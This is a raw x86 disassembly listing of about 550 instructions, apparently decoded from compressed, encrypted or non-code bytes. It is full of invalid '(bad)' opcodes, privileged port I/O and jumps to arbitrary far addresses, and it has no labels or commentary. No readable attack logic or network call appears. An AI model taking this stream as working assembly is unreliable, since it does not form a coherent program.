  418a07:	fdiv   QWORD PTR ds:0x59fb7713
  418a0d:	sbb    eax,0xa4da5513
  418a12:	arpl   WORD PTR [ecx-0xa80e49c],si
  418a18:	loope  0x418a43
  418a1a:	jg     0x418a22
  418a1c:	scas   al,BYTE PTR es:[edi]
  418a1d:	stos   BYTE PTR es:[edi],al
  418a1e:	mov    bh,dh
  418a20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418a21:	imul   esi,DWORD PTR [ebx],0x5db0dd52
  418a27:	add    BYTE PTR ds:0x64ccf77f,dh
  418a2d:	cmp    edi,DWORD PTR [eax-0x3320e6e7]
  418a33:	sub    eax,0xb57e30ad
  418a38:	repz cdq 
  418a3a:	in     eax,0x31
  418a3c:	jge    0x418a54
  418a3e:	mov    BYTE PTR [ecx],0xcc
  418a41:	mov    edi,0xbe4cc649
  418a46:	nop
  418a47:	add    BYTE PTR [ecx],bl
  418a49:	add    bl,BYTE PTR [ecx+0x73bd47bc]
  418a4f:	pop    ebp
  418a50:	mov    esi,0xf3559ac
  418a55:	ss xchg ebp,eax
  418a57:	pushf  
  418a58:	(bad)  
  418a59:	mov    dh,0x78
  418a5b:	fisubr DWORD PTR [eax-0x3923e1cb]
  418a61:	sbb    BYTE PTR [esp+eax*2+0x6b],bl
  418a65:	xor    ebx,DWORD PTR [edx]
  418a67:	pop    ss
  418a68:	jnp    0x418a6f
  418a6a:	cwde   
  418a6b:	dec    esp
  418a6c:	mov    dh,0xf6
  418a6e:	aad    0x1b
  418a70:	pushf  
  418a71:	add    dh,BYTE PTR [esi]
  418a73:	pop    edi
  418a74:	aad    0xe1
  418a76:	mov    ah,0x1d
  418a78:	push   0x2c
  418a7a:	pusha  
  418a7b:	aam    0x11
  418a7d:	not    dh
  418a7f:	daa    
  418a80:	sub    eax,0x6c638b89
  418a85:	fmul   QWORD PTR [edi+eiz*2-0x71]
  418a89:	sbb    al,0x78
  418a8b:	add    BYTE PTR [ecx-0x53],0x30
  418a8f:	and    BYTE PTR [edx-0x22],dh
  418a92:	repnz adc esi,DWORD PTR [ebx]
  418a95:	jno    0x418ab8
  418a97:	cli    
  418a98:	out    dx,al
  418a99:	push   ds
  418a9a:	pop    ebx
  418a9b:	mov    dl,0x8
  418a9d:	dec    esi
  418a9e:	xchg   ebx,eax
  418a9f:	(bad)  
  418aa0:	scas   al,BYTE PTR es:[edi]
  418aa1:	leave  
  418aa2:	xor    bh,BYTE PTR [ebx+ebx*2-0x48]
  418aa6:	add    BYTE PTR [ebx+ecx*2+0x6c0d2d9c],0x88
  418aae:	lds    ebp,FWORD PTR [edx]
  418ab0:	ret    0x9475
  418ab3:	stos   BYTE PTR es:[edi],al
  418ab4:	fcom   QWORD PTR [ebp+0x1b]
  418ab7:	and    bl,BYTE PTR [eax+0x74c3048a]
  418abd:	and    edi,ebp
  418abf:	call   0xf5236bc2
  418ac4:	fsqrt  
  418ac6:	jle    0x418b45
  418ac8:	fdiv   st(3),st
  418aca:	or     al,0x56
  418acc:	ret    0xda55
  418acf:	mov    ecx,0x1eeb0674
  418ad4:	mov    ds:0xfe5105c3,al
  418ad9:	(bad)  
  418ada:	jecxz  0x418b17
  418adc:	xchg   edi,edi
  418ade:	jbe    0x418b5a
  418ae0:	or     al,0x6a
  418ae2:	outs   dx,BYTE PTR ds:[esi]
  418ae3:	cld    
  418ae4:	(bad)  
  418ae5:	div    DWORD PTR [ebx+0x60]
  418ae8:	repz into 
  418aea:	push   0x554d3c2d
  418aef:	jl     0x418b30
  418af1:	inc    eax
  418af2:	sti    
  418af3:	dec    edx
  418af4:	sbb    DWORD PTR [esi],ecx
  418af6:	jno    0x418b03
  418af8:	dec    esp
  418af9:	xor    esp,DWORD PTR [ecx-0x79]
  418afc:	test   al,0x9c
  418afe:	bound  esp,QWORD PTR [edx-0x1425c200]
  418b04:	pop    ds
  418b05:	and    al,0x8d
  418b07:	aad    0x2c
  418b09:	lock mov dh,0x2e
  418b0c:	pop    ebp
  418b0d:	add    al,0xb3
  418b0f:	loope  0x418b71
  418b11:	pop    esp
  418b12:	popf   
  418b13:	out    dx,al
  418b14:	mov    dl,0xf6
  418b16:	add    esi,edx
  418b18:	jns    0x418abc
  418b1a:	out    0x1c,eax
  418b1c:	hlt    
  418b1d:	or     eax,0xb2dd7f09
  418b22:	rcr    edi,0x63
  418b25:	add    ecx,eax
  418b27:	cmp    BYTE PTR [esi-0x660ccb73],bh
  418b2d:	ins    DWORD PTR es:[edi],dx
  418b2e:	sub    al,0xef
  418b30:	out    0xaa,al
  418b32:	shl    dh,1
  418b34:	xchg   BYTE PTR [esi+0x2d],dh
  418b37:	jecxz  0x418aee
  418b39:	or     ah,bh
  418b3b:	das    
  418b3c:	push   ds
  418b3d:	into   
  418b3e:	ins    BYTE PTR es:[edi],dx
  418b3f:	and    al,0x47
  418b41:	push   edx
  418b42:	cdq    
  418b43:	fbld   TBYTE PTR ds:0x3d6fe551
  418b49:	call   0xf4756882
  418b4e:	(bad)  
  418b4f:	in     eax,0x2
  418b51:	sbb    ecx,ebx
  418b53:	das    
  418b54:	jns    0x418b12
  418b56:	int    0x8f
  418b58:	adc    esi,ecx
  418b5a:	fs aas 
  418b5c:	je     0x418b53
  418b5e:	inc    ebp
  418b5f:	lahf   
  418b60:	and    dh,dh
  418b62:	pop    es
  418b63:	sub    dl,BYTE PTR [esi-0x7d]
  418b66:	and    edi,ebx
  418b68:	iret   
  418b69:	and    BYTE PTR [eax+0x180e5c41],bh
  418b6f:	push   ds
  418b70:	sub    eax,0x422a9d0a
  418b75:	add    ch,BYTE PTR [ebp-0x1]
  418b78:	rcl    ebp,0x85
  418b7b:	(bad)  
  418b7c:	loop   0x418b1b
  418b7e:	xor    DWORD PTR [edi+eiz*1],edi
  418b81:	push   eax
  418b82:	xlat   BYTE PTR ds:[ebx]
  418b83:	jmp    0xac2e2048
  418b88:	sbb    al,0x51
  418b8a:	xchg   ebp,eax
  418b8b:	xchg   ebp,eax
  418b8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b8d:	jmp    0xb11d878e
  418b92:	in     eax,dx
  418b93:	mov    esi,0xae6e3967
  418b98:	pushf  
  418b99:	pop    esi
  418b9a:	test   eax,0x49375f18
  418b9f:	jecxz  0x418b53
  418ba1:	ror    BYTE PTR [edi-0x78],1
  418ba4:	push   esp
  418ba5:	fwait
  418ba6:	(bad)  
  418ba7:	cmp    DWORD PTR [ecx],esi
  418ba9:	inc    ebp
  418baa:	rcl    esp,0x47
  418bad:	xlat   BYTE PTR ds:[ebx]
  418bae:	sub    eax,0x4ba01af5
  418bb3:	jp     0x418bc9
  418bb5:	xor    ah,dl
  418bb7:	push   ebp
  418bb8:	dec    esi
  418bb9:	jns    0x418c00
  418bbb:	pop    eax
  418bbc:	test   ebp,0x2a7da72d
  418bc2:	or     eax,0x86ccf8df
  418bc7:	mov    edi,edx
  418bc9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418bca:	fsubr  QWORD PTR [ecx]
  418bcc:	and    ebp,DWORD PTR [esi+0x7e81e59c]
  418bd2:	pop    ss
  418bd3:	(bad)  
  418bd4:	cmp    bl,dh
  418bd6:	rol    BYTE PTR [edx+0x72d47a7],cl
  418bdc:	or     BYTE PTR [ebx+ecx*1-0x78ac9ae8],bl
  418be3:	outs   dx,DWORD PTR ds:[esi]
  418be4:	add    edx,DWORD PTR [eax-0x57]
  418be7:	retf   0x86c0
  418bea:	xchg   edi,eax
  418beb:	js     0x418b87
  418bed:	and    DWORD PTR [ebp+ebx*2+0x2e],ebp
  418bf1:	mov    cl,0xe
  418bf3:	xchg   ebp,eax
  418bf4:	cmp    esp,edx
  418bf6:	push   ebp
  418bf7:	fmul   QWORD PTR [esi-0x6cafa8ee]
  418bfd:	test   DWORD PTR [ebx+0x53],ecx
  418c00:	or     edi,DWORD PTR [esi]
  418c02:	push   0x66650973
  418c07:	dec    esi
  418c08:	push   es
  418c09:	(bad)  
  418c0a:	ss xchg ebp,eax
  418c0c:	jmp    0xb80a325d
  418c11:	fstp   QWORD PTR [eax-0x4385d0a9]
  418c17:	sar    BYTE PTR es:[edi],cl
  418c1a:	pop    edi
  418c1b:	les    ebx,FWORD PTR [eax+0x43]
  418c1e:	cld    
  418c1f:	mov    BYTE PTR es:[ebp-0x15e387f9],0x8e
  418c27:	push   eax
  418c28:	mov    ah,0xc7
  418c2a:	shl    BYTE PTR [eax],cl
  418c2c:	jle    0x418c02
  418c2e:	sbb    dl,BYTE PTR [edx+0x6aca235b]
  418c34:	fimul  DWORD PTR [ebx-0x5705e11]
  418c3a:	mov    ecx,0x35c4bc33
  418c3f:	add    DWORD PTR [edx+0x9],esi
  418c42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c43:	add    al,0x12
  418c45:	imul   edx,DWORD PTR [eax-0x61],0x71
  418c49:	or     eax,0xd60d66b
  418c4e:	dec    ecx
  418c4f:	ins    DWORD PTR es:[edi],dx
  418c50:	sub    eax,0xcb9fdf16
  418c55:	mov    ebp,0xb787d2c3
  418c5a:	pop    esp
  418c5b:	push   ecx
  418c5c:	push   es
  418c5d:	dec    ecx
  418c5e:	pushf  
  418c5f:	xchg   esi,eax
  418c60:	dec    edx
  418c61:	ins    DWORD PTR es:[edi],dx
  418c62:	je     0x418c46
  418c64:	leave  
  418c65:	pushf  
  418c66:	inc    ecx
  418c67:	stos   DWORD PTR es:[edi],eax
  418c68:	aad    0x74
  418c6a:	ins    BYTE PTR es:[edi],dx
  418c6b:	jmp    0x418c1c
  418c6d:	(bad)  
  418c6e:	or     BYTE PTR [esi+ebx*8+0x297d119e],ch
  418c75:	add    eax,edi
  418c77:	pop    ds
  418c78:	xor    al,0x66
  418c7a:	hlt    
  418c7b:	aad    0x97
  418c7d:	out    dx,eax
  418c7e:	loop   0x418cf2
  418c80:	mov    cl,0x8
  418c82:	xor    al,0xce
  418c84:	mov    ds:0x57dda451,al
  418c89:	addr16 pop edx
  418c8b:	mov    edi,0x5a7f8892
  418c90:	daa    
  418c91:	bound  ecx,QWORD PTR [eax]
  418c93:	adc    BYTE PTR [edi-0x65],0x74
  418c97:	fsub   QWORD PTR [eax+edi*8]
  418c9a:	ds inc ecx
  418c9c:	adc    bh,BYTE PTR [eax+0x47]
  418c9f:	ss inc ebx
  418ca1:	int3   
  418ca2:	sub    DWORD PTR [edi-0x69],esp
  418ca5:	xchg   ebp,eax
  418ca6:	lods   al,BYTE PTR ds:[esi]
  418ca7:	aad    0xda
  418ca9:	popf   
  418caa:	jns    0x418ce1
  418cac:	inc    ecx
  418cad:	sbb    DWORD PTR [ebp-0x3],edi
  418cb0:	adc    esi,DWORD PTR [esi+0x64acfc57]
  418cb6:	push   ds
  418cb7:	or     DWORD PTR [eax-0x41],edx
  418cba:	jbe    0x418c46
  418cbc:	adc    eax,0xdef70d6e
  418cc1:	pushf  
  418cc2:	repz mov cs,WORD PTR [ebx+0x4d]
  418cc6:	fnstsw WORD PTR [ebp-0x7c]
  418cc9:	inc    esp
  418cca:	jl     0x418d31
  418ccc:	adc    al,0x35
  418cce:	cld    
  418ccf:	stc    
  418cd0:	cdq    
  418cd1:	outs   dx,BYTE PTR ds:[esi]
  418cd2:	mov    al,ds:0x5618dd2b
  418cd7:	(bad)  
  418cd8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418cd9:	inc    eax
  418cda:	ins    BYTE PTR es:[edi],dx
  418cdb:	xchg   edi,eax
  418cdc:	add    DWORD PTR [edx+0x78],ebx
  418cdf:	icebp  
  418ce0:	pop    ss
  418ce1:	dec    ebp
  418ce2:	pop    esp
  418ce3:	fmulp  st(6),st
  418ce5:	mov    ds:0xc568f279,eax
  418cea:	sbb    esp,DWORD PTR [ecx]
  418cec:	pop    edx
  418ced:	xchg   esp,eax
  418cee:	mov    al,0x37
  418cf0:	retf   
  418cf1:	sahf   
  418cf2:	jecxz  0x418cbd
  418cf4:	mov    bl,0xff
  418cf6:	cmp    BYTE PTR [edi+ecx*2-0x77],dh
  418cfa:	sbb    DWORD PTR [ebx-0x57],ebp
  418cfd:	shl    DWORD PTR [ebx+0x2439facb],0x38
  418d04:	in     eax,dx
  418d05:	adc    eax,DWORD PTR [ebx-0x3faca689]
  418d0b:	leave  
  418d0c:	add    eax,0x24b3509f
  418d11:	data16 aas 
  418d13:	sub    al,BYTE PTR [eax]
  418d15:	jbe    0x418c99
  418d17:	sbb    esp,ebx
  418d19:	std    
  418d1a:	fld    TBYTE PTR [ecx+0x3424836b]
  418d20:	add    eax,DWORD PTR [ebp-0x629ae5a8]
  418d26:	je     0x418d58
  418d28:	mov    al,ds:0x80bfdfae
  418d2d:	fld    QWORD PTR [eax+0xbd4d92e]
  418d33:	and    al,0xf2
  418d35:	add    edx,ebx
  418d37:	sub    al,0x6b
  418d39:	lods   eax,DWORD PTR ds:[esi]
  418d3a:	test   al,0x69
  418d3c:	xchg   edx,eax
  418d3d:	xor    BYTE PTR [ebx-0x27],bl
  418d40:	repnz push edx
  418d42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d43:	(bad)  
  418d44:	psubusb mm3,QWORD PTR [ebx+0x144c3b05]
  418d4b:	ror    DWORD PTR [ebx],cl
  418d4d:	pop    ebx
  418d4e:	inc    esi
  418d4f:	adc    edx,DWORD PTR [edi-0x58]
  418d52:	dec    eax
  418d53:	popf   
  418d54:	in     al,0xb8
  418d56:	add    DWORD PTR [eax+0x77],0x7b81fa19
  418d5d:	pop    ds
  418d5e:	loopne 0x418d0d
  418d60:	addr16 mov esp,0xd1b2fe82
  418d66:	push   edx
  418d67:	mov    esp,0x10921934
  418d6c:	sbb    DWORD PTR ds:0xc5537eca,ecx
  418d72:	xor    esp,DWORD PTR [ecx+0x1ca72d4a]
  418d78:	das    
  418d79:	mov    ds:0x35ea2587,al
  418d7e:	xchg   edi,eax
  418d7f:	(bad)  [ebx-0x11]
  418d82:	mov    edi,0x61a3f5df
  418d87:	stos   DWORD PTR es:[edi],eax
  418d88:	jle    0x418df5
  418d8a:	add    BYTE PTR [edx+eiz*4],dl
  418d8d:	std    
  418d8e:	mov    bl,BYTE PTR [edx-0x21d1afe3]
  418d94:	jno    0x418dc5
  418d96:	pop    ecx
  418d97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418d98:	pop    ds
  418d99:	test   BYTE PTR [eiz*1-0x76e34c3b],al
  418da0:	inc    eax
  418da1:	loop   0x418d3d
  418da3:	(bad)  
  418da4:	adc    BYTE PTR [ebx-0x3e6db34c],cl
  418daa:	fsubr  DWORD PTR [edx+0x366aa3dc]
  418db0:	inc    esi
  418db1:	or     eax,0x7ca47013
  418db6:	adc    BYTE PTR [ebx],0x7d
  418db9:	pop    eax
  418dba:	pop    esi
  418dbb:	int    0xfa
  418dbd:	popa   
  418dbe:	dec    edx
  418dbf:	adc    al,0x9
  418dc1:	jb     0x418def
  418dc3:	fwait
  418dc4:	mov    esp,DWORD PTR [edi-0x17b98023]
  418dca:	mov    cl,cl
  418dcc:	icebp  
  418dcd:	out    0x10,al
  418dcf:	out    0x14,al
  418dd1:	mov    edi,0x621e0d37
  418dd6:	xchg   edx,eax
  418dd7:	sbb    edi,eax
  418dd9:	xor    ecx,DWORD PTR [edx]
  418ddb:	popa   
  418ddc:	cli    
  418ddd:	mov    al,ds:0xf0da8a59
  418de2:	push   ss
  418de3:	adc    esi,DWORD PTR [ebx]
  418de5:	jb     0x418da6
  418de7:	mov    cl,0xe6
  418de9:	retf   0x1ca6
  418dec:	scas   al,BYTE PTR es:[edi]
  418ded:	in     eax,0xdf
  418def:	jp     0x418e19
  418df1:	imul   edx,esp,0xffffffe7
  418df4:	jns    0x418dad
  418df6:	das    
  418df7:	or     ah,BYTE PTR [edx]
  418df9:	in     eax,dx
  418dfa:	add    edx,ebp
  418dfc:	ja     0x418dbb
  418dfe:	xchg   edi,eax
  418dff:	push   eax
  418e00:	mov    bh,0x50
  418e02:	and    al,0xb8
  418e04:	pop    eax
  418e05:	mov    edx,0x531c4057
  418e0a:	sub    eax,DWORD PTR [ecx-0x414ec3e4]
  418e10:	mov    al,bh
  418e12:	adc    ebx,edx
  418e14:	inc    esp
  418e15:	jns    0x418e49
  418e17:	rcr    ebp,0x86
  418e1a:	mov    eax,ds:0x78abef62
  418e1f:	test   eax,0x574be241
  418e24:	fsqrt  
  418e26:	(bad)  
  418e27:	out    dx,al
  418e28:	sub    DWORD PTR [eax-0x2],ebx
  418e2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e2c:	xor    ecx,ecx
  418e2e:	pusha  
  418e2f:	xchg   esi,eax
  418e30:	jno    0x418e71
  418e32:	jle    0x418e65
  418e34:	(bad)  
  418e35:	push   0x510870f6
  418e3a:	xchg   ebx,eax
  418e3b:	je     0x418ea9
  418e3d:	xor    eax,0x97a52f3f
  418e42:	and    eax,0x4ff201f8
  418e47:	(bad)  
  418e48:	mov    al,0x3d
  418e4a:	and    ah,dh
  418e4c:	jle    0x418e27
  418e4e:	ja     0x418e93
  418e50:	imul   edi,DWORD PTR [esi+0x49],0xeeca876
  418e57:	into   
  418e58:	ins    BYTE PTR es:[edi],dx
  418e59:	fs (bad) 
  418e5b:	shr    BYTE PTR [ebx+edx*1-0x6fa06244],1
  418e62:	daa    
  418e63:	or     eax,0x46397086
  418e68:	(bad)  
  418e69:	aam    0xd0
  418e6b:	xchg   edi,eax
  418e6c:	shl    dl,cl
  418e6e:	fidiv  WORD PTR [ebx-0x33dede40]
  418e74:	push   es
  418e75:	out    0x7d,al
  418e77:	mov    bl,0x65
  418e79:	cmp    al,0x73
  418e7b:	fisttp WORD PTR [ebx-0x2e]
  418e7e:	pop    esp
  418e7f:	dec    ecx
  418e80:	cmp    ah,BYTE PTR [ebp-0x33]
  418e83:	xchg   esp,eax
  418e84:	push   eax
  418e85:	out    0xb9,eax
  418e87:	mov    eax,0x51d9b0a4
  418e8c:	sbb    eax,DWORD PTR [edx-0x37]
  418e8f:	pusha  
  418e90:	mov    dl,BYTE PTR [ebx+edx*2-0x63]
  418e94:	in     eax,0x14
  418e96:	lods   eax,DWORD PTR ds:[esi]
  418e97:	or     BYTE PTR [edx],dl
  418e99:	js     0x418e5c
  418e9b:	les    eax,FWORD PTR [ecx+0x1fff1354]
  418ea1:	mov    bh,0x8d
  418ea3:	push   ds
  418ea4:	mov    esp,DWORD PTR [ebp-0x3b]
  418ea7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ea9:	lods   al,BYTE PTR ds:[esi]
  418eaa:	scas   eax,DWORD PTR es:[edi]
  418eab:	sub    dl,bh
  418ead:	cmp    ah,BYTE PTR [esi+0x57]
  418eb0:	imul   ecx,DWORD PTR [ebp-0x57],0x67
  418eb4:	dec    edx
  418eb5:	cdq    
  418eb6:	mov    ch,0xd4
  418eb8:	cmp    eax,0x65cbca07
  418ebd:	dec    eax
  418ebe:	dec    ebp
  418ebf:	shl    BYTE PTR [esi+esi*1-0x72f1d1a8],0x5e
  418ec7:	ror    ah,0xf6
  418eca:	push   eax
  418ecb:	jp     0x418e5c
  418ecd:	mov    ds:0xf1ae1d35,eax
  418ed2:	clc    
  418ed3:	ret    0x99a6
  418ed6:	dec    edi
  418ed7:	pop    ebp
  418ed8:	pushf  
  418ed9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418eda:	lods   eax,DWORD PTR ds:[esi]
  418edb:	mov    edx,0xcc44530d
  418ee0:	dec    ebx
  418ee1:	jnp    0x418f62
  418ee3:	retf   0x967d
  418ee6:	daa    
  418ee7:	dec    edx
  418ee8:	sbb    dl,ch
  418eea:	hlt    
  418eeb:	sub    BYTE PTR [esi+0x63],cl
  418eee:	fisttp WORD PTR [ecx]
  418ef0:	rcl    ecx,cl
  418ef2:	sbb    DWORD PTR [eax-0x8],ebx
  418ef5:	mov    DWORD PTR [esi-0x72],0x19b84d5d
  418efc:	push   es
  418efd:	fst    QWORD PTR [ecx-0x55faa6f3]
  418f03:	pop    ebp
  418f04:	test   al,0x6a
  418f06:	das    
  418f07:	sbb    edi,DWORD PTR [edi-0x5c1bb7a2]
  418f0d:	dec    eax
  418f0e:	and    eax,0xd02c758f
  418f13:	scas   eax,DWORD PTR es:[edi]
  418f14:	or     edx,esi
  418f16:	retf   0x61d0
  418f19:	sub    edx,ebx
  418f1b:	jmp    0x46a9f01
  418f20:	pushf  
  418f21:	jo     0x418ed5
  418f23:	jbe    0x418f1d
  418f25:	xchg   eax,ebx
  418f27:	add    BYTE PTR [edx],bh
  418f29:	test   BYTE PTR [ebx-0x50],bh
  418f2c:	cld    
  418f2d:	(bad)  
  418f2e:	es stos BYTE PTR es:[edi],al
  418f30:	jae    0x418ef1
  418f32:	in     al,0xb3
  418f34:	adc    DWORD PTR [edi-0x1689e43d],edi
  418f3a:	and    al,0xbd
  418f3c:	sbb    al,0x7b
  418f3e:	mov    bl,0x20
  418f40:	cmp    DWORD PTR [edx+0x7e5f685f],esp
  418f46:	sub    al,BYTE PTR [ebx+0x2c]
  418f49:	mov    esi,0xcbf85376
  418f4e:	pop    ss
  418f4f:	and    BYTE PTR [ebx-0x24c8d31c],dh
  418f55:	scas   al,BYTE PTR es:[edi]
  418f56:	xchg   ebx,eax
  418f57:	(bad)  
  418f59:	inc    DWORD PTR [ebp+0x3]
  418f5c:	addr16 (bad) 
  418f5e:	bound  eax,QWORD PTR [edx-0x5]
  418f61:	out    0x92,al
  418f63:	cmp    BYTE PTR [esp+edi*8+0x33],cl
  418f67:	or     eax,0xa7d2984f
  418f6c:	sbb    dl,BYTE PTR [edi]
  418f6e:	mov    BYTE PTR [ebp-0x3],dl
  418f71:	inc    esp
  418f72:	sub    eax,0x6844c09d
  418f77:	pop    ebp
  418f78:	loop   0x418fb1
  418f7a:	scas   al,BYTE PTR es:[edi]
  418f7b:	push   ecx
  418f7c:	mov    ds:0x580fedcc,al
  418f81:	push   esi
  418f82:	mov    dl,0x7a
  418f84:	sbb    DWORD PTR [ecx+edx*2-0x50],ecx
  418f88:	and    ch,BYTE PTR [ebp+0x1f]
  418f8b:	xor    ecx,ebx
  418f8d:	out    dx,al
  418f8e:	shl    dl,cl
  418f90:	or     DWORD PTR [ecx+0x0],esi
  418f93:	lock and DWORD PTR [ecx],edi
  418f96:	ins    DWORD PTR es:[edi],dx
  418f97:	fisub  WORD PTR [ebx]
  418f99:	push   es
  418f9a:	dec    ebx
  418f9b:	call   0xfd4b:0x41f8a1f5
  418fa2:	daa    
  418fa3:	pop    esi
  418fa4:	fcmove st,st(6)
  418fa6:	xchg   BYTE PTR [ebx-0x1a],ah
  418fa9:	pusha  
  418faa:	cs popf 
  418fac:	xchg   esp,eax
  418fad:	(bad)  [ecx]
  418faf:	lahf   
  418fb0:	(bad)  [edi+ebp*1+0x18dd6765]
  418fb7:	jge    0x418f75
  418fb9:	cmp    al,0xc4
  418fbb:	push   ds
  418fbc:	pop    esp
  418fbd:	pusha  
  418fbe:	cmp    eax,0x430c3996
  418fc3:	pop    eax
  418fc4:	popa   
  418fc5:	jb     0x419044
  418fc7:	arpl   WORD PTR [esi],bp
  418fc9:	jnp    0x418fdc
  418fcb:	into   
  418fcc:	jbe    0x419023
  418fce:	stos   BYTE PTR es:[edi],al
  418fcf:	repz sbb DWORD PTR ds:0x458a10cc,edi
  418fd6:	cmp    DWORD PTR [ecx-0x1a],ebx
  418fd9:	loop   0x418fc9
  418fdb:	sbb    eax,0x8fb78392
  418fe0:	jns    0x418ffe
  418fe2:	mov    esi,0x554e7686
  418fe7:	xor    BYTE PTR [edi-0x41],0x74
  418feb:	hlt    
  418fec:	fsubrp st(7),st
  418fee:	inc    ebx
  418fef:	and    ecx,DWORD PTR [eax+0x14]
  418ff2:	mov    ebp,DWORD PTR [ecx-0x60defb12]
  418ff8:	jae    0x418f87
  418ffa:	jns    0x419049
  418ffc:	in     eax,dx
  418ffd:	mov    edi,0xbdaadacf
  419002:	inc    ebx
  419003:	pop    ebp
  419004:	pop    esp
  419006:	stc    
  419007:	dec    ebx
  419008:	and    DWORD PTR [edi],0xffffffcd
  41900b:	aas    
  41900c:	or     ah,dl
  41900e:	push   esi
  41900f:	push   0xc7c7af7b
  419014:	scas   al,BYTE PTR es:[edi]
  419015:	or     ebp,DWORD PTR [eax+0x44]
  419018:	jnp    0x418ffd
  41901a:	in     al,dx
  41901b:	sbb    cl,BYTE PTR ds:0xcaef9d8b
  419021:	leave  
  419022:	ret    
  419023:	call   0xd80a:0xd65328fb
  41902a:	mul    DWORD PTR [esi]
  41902c:	in     al,0xd7
  41902e:	imul   ebx,DWORD PTR [edi+edx*1],0xfffffffc
  419032:	and    ah,BYTE PTR [esi-0x2b]
  419035:	sub    eax,0x91f0d9f3
  41903a:	jo     0x419058
  41903c:	loope  0x418fdc
  41903e:	mov    eax,ds:0xd08a6362
  419043:	sar    dh,0xaa
  419046:	cmp    al,0xdb
  419048:	and    BYTE PTR [ebx+esi*4],0xb8
  41904c:	jae    0x4190aa
  41904e:	loop   0x419090
  419050:	icebp  
  419051:	push   es
  419052:	jo     0x4190c4
  419054:	xor    ch,BYTE PTR [ebp-0x57]
  419057:	test   BYTE PTR [edx-0x54],ch
  41905a:	push   edi
  41905b:	sub    DWORD PTR [esi],esp
  41905d:	ins    DWORD PTR es:[edi],dx
  41905e:	jne    0x4190ad
  419060:	stos   DWORD PTR es:[edi],eax
  419061:	popf   
  419062:	mov    BYTE PTR [esi-0x3c],0x62
  419066:	lahf   
  419067:	mov    cl,0xdd
  419069:	lods   al,BYTE PTR ds:[esi]
  41906a:	sub    BYTE PTR [esi],0xd9
  41906d:	mov    ecx,ss
  41906f:	stos   BYTE PTR es:[edi],al
  419070:	cld    
  419071:	aam    0x40
  419073:	pop    eax
  419074:	(bad)  
  419076:	dec    edx
  419077:	aam    0x8f
  419079:	jae    0x4190ca
  41907b:	stc    
  41907c:	and    ah,BYTE PTR [ebx-0x44]
  41907f:	stos   DWORD PTR es:[edi],eax
  419080:	call   0xdad5:0x42cd8f8f
  419087:	ss out 0x86,al
  41908a:	nop
  41908b:	sbb    BYTE PTR [edx+0x70b7ab2d],cl
  419091:	retf   
  419092:	mov    ah,al
  419094:	sbb    eax,0xfc296bbf
  419099:	mov    eax,ds:0xb5507eff
  41909e:	gs int3 
  4190a0:	fdivr  st,st(5)
  4190a2:	int    0x9d
  4190a4:	cmp    BYTE PTR [ebp+esi*8+0x62f5a0c5],al
  4190ab:	shl    dl,cl
  4190ad:	clc    
  4190ae:	loope  0x41911c
  4190b0:	outs   dx,BYTE PTR ds:[esi]
  4190b1:	in     al,0xb8
  4190b3:	mov    DWORD PTR [ecx+0x6e36628],ebx
  4190b9:	in     al,dx
  4190ba:	pop    ebx
  4190bb:	cmc    
  4190bc:	stc    
  4190bd:	mov    ecx,0x5419547c
  4190c2:	int    0xbe
  4190c4:	xor    DWORD PTR [esi-0x4fb108d9],0xffffffff
  4190cb:	xadd   BYTE PTR [eax+ebp*4-0x370da191],ch
  4190d3:	loop   0x4190cf
  4190d5:	adc    DWORD PTR [edx],ebp
  4190d7:	mov    DWORD PTR [esi],esp
  4190d9:	pushf  
  4190da:	dec    ecx
  4190db:	and    eax,0xdb0a518a
  4190e0:	and    eax,DWORD PTR [esi]
  4190e2:	out    dx,al
  4190e3:	ret    
  4190e4:	rol    edx,1
  4190e6:	pop    edi
  4190e7:	inc    ebp
  4190e8:	xchg   esi,eax
  4190e9:	rcl    DWORD PTR [edi+0x1d8b1ef0],cl
  4190ef:	xchg   edi,eax
  4190f0:	aam    0xf9
  4190f2:	ins    BYTE PTR es:[edi],dx
  4190f3:	scas   eax,DWORD PTR es:[edi]
  4190f4:	mov    bh,0xa0
  4190f6:	clc    
  4190f7:	and    esi,DWORD PTR ds:0xc2795753
  4190fd:	or     al,0x7e
  4190ff:	xchg   ebp,eax
  419100:	mov    dl,0x1
  419102:	shr    DWORD PTR [ebp-0x39],0x9f
  419106:	rcl    BYTE PTR [ebx],cl
  419108:	mov    BYTE PTR [esi-0x65],dl
  41910b:	add    DWORD PTR [ebp+0x1214ba53],edx
  419111:	test   DWORD PTR [eax+0x3ec17702],eax
  419117:	xor    BYTE PTR [ebp-0x60],0x3e
  41911b:	bound  edx,QWORD PTR [ecx+esi*8]
  41911e:	cld    
  41911f:	aam    0x5e
  419121:	mov    ?,WORD PTR [edx]
  419123:	pusha  
  419124:	sub    BYTE PTR [ebx-0x74],ah
  419127:	dec    eax
  419128:	cdq    
  419129:	fst    DWORD PTR [edi-0x9]
  41912c:	icebp  
  41912d:	rcl    bh,0x3d
  419130:	(bad)  
  419131:	aam    0x64
  419133:	hlt    
  419134:	inc    ebp
  419135:	frstor [ebx]
  419137:	cmp    DWORD PTR [edi+0x3a],0x69
  41913b:	xchg   edx,eax
  41913c:	xor    DWORD PTR [eax],ebp
  41913e:	dec    eax
  41913f:	(bad)  
  419140:	sbb    bl,BYTE PTR [ebp+ebp*2-0x34d67997]
  419147:	push   eax
  419148:	sub    al,0xa0
  41914a:	fsub   QWORD PTR [esi]
  41914c:	xor    ecx,0xffffff95
  41914f:	int3   
  419150:	ds cwde 
  419152:	sti    
  419153:	sbb    eax,0x5a025c1b
  419158:	aam    0x47
  41915a:	or     al,dh
  41915c:	pop    es
  41915d:	or     DWORD PTR [eax+0x25],eax
  419160:	jmp    0x3205:0xeaa73e28
  419167:	lods   al,BYTE PTR ds:[esi]
  419168:	sar    BYTE PTR [eax-0x1c],1
  41916b:	(bad)  
  41916c:	pop    ebx
  41916d:	icebp  
  41916e:	aaa    
  41916f:	cmp    ecx,DWORD PTR [edi+0xd]
  419172:	gs add ch,ah
